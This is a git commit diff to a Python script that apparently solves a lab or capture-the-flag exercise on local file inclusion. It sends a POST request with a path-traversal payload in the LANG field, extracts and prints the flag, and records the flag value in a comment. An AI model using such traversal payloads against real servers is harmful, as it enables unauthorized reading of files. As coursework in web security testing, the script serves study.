8e1d16a98a0997afdefd43d63dce7ed4081837c6
Yumingyuan <timdavid@vip.qq.com>
2019-05-22 16:24:54 +0800

    case25 local file inclusion

--- wsb/case25_Local_file_inclusion.py
+++ wsb/case25_Local_file_inclusion.py
@@ -5,4 +5,5 @@ payload_data={"LANG":"../../../../../../../../../var/www/html/Assignment2/lfi.tx
 r=requests.post(request_url,data=payload_data)
 re_result=re.findall("The flag is (.*)",r.text)
 print("The flag is:"+re_result[0])
+print("The payload is:",payload_data)
 #The flag is urF8uDT7HnnFZTd
